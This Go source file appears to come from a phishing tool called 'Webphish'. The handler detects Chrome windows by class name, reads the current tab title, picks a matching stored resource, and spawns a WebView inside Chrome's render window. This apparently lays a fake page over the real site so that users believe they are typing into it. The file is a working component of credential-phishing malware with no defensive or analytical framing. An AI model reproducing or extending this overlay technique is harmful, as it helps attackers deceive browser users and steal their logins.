package handler

import (
	"Webphish/internal/edge"
	"Webphish/internal/resource"
	"Webphish/internal/win"
	"Webphish/internal/writer"
	"golang.org/x/sys/windows"
)

const (
	TitleWindowClass         = "Chrome_WidgetWin_1"
	RenderWindowsParentClass = "Chrome_WidgetWin_0"
	RenderWindowClass        = "Chrome_RenderWidgetHostHWND"
)

func GetRenderWindowParent(hwnds []windows.HWND) (windows.HWND, bool) {
	for _, hwnd := range hwnds {
		if win.GetChildCount(hwnd) > 0 {
			return hwnd, true
		}
	}
	return windows.HWND(0), false
}

type ChromeHandlerFactory struct{}

func (factory *ChromeHandlerFactory) New() BrowserHandler {
	return &ChromeHandler{}
}

type ChromeHandler struct {
	writer writer.ApplicationOutputWriter
	loader resource.Loader
}

func (handler *ChromeHandler) OutputWriter() writer.ApplicationOutputWriter {
	return handler.writer
}

func (handler *ChromeHandler) SetOutputWriter(writer writer.ApplicationOutputWriter) {
	handler.writer = writer
}

func (handler *ChromeHandler) SetResourceLoader(loader resource.Loader) {
	handler.loader = loader
}

func (handler *ChromeHandler) ResourceLoader() resource.Loader {
	return handler.loader
}

func (handler *ChromeHandler) Handle(changed string, hwnd windows.HWND) (parent windows.HWND, created edge.WebView) {
	//console.MessageBoxPlain("Changed Window", fmt.Sprintf("%x", hwnd))
	windowClass := win.GetWindowClassName(hwnd)
	if windowClass != TitleWindowClass {
		//console.MessageBoxPlain("Error", "Window not correct title class")
		return
	}
	titleWindows := win.FindWindowForClass(TitleWindowClass)
	if len(titleWindows) <= 0 {
		//console.MessageBoxPlain("Error", "Could not get title windows")
	}

	currentTitle := ""
	currentRenderWindow := windows.HWND(0)
	for _, hwin := range titleWindows {
		title := win.GetWindowText(hwin)
		if title != "" {
			currentTitle = title

			render, success := win.FindChildWindowForClass(hwin, RenderWindowClass)
			if success {
				currentRenderWindow = render
				break
			}
		}
	}
	if currentTitle == "" {
		return
	}

	win0 := win.FindWindowForClass(RenderWindowsParentClass)
	for _, hwin := range win0 {
		renderWindow, success := win.FindChildWindowForClass(hwin, RenderWindowClass)
		if success && currentRenderWindow == windows.HWND(0) {
			currentRenderWindow = renderWindow
		}
	}

	path, _ := handler.ResourceLoader().MatchingResource(currentTitle)
	// path, _ := resource.GetMatchingResource(currentTitle)
	spawned := win.SpawnWindow(path, currentRenderWindow, handler.writer, handler.loader.Get)
	go spawned.(edge.WebView).Run()

	parent = currentRenderWindow
	created = spawned.(edge.WebView)
	return
}
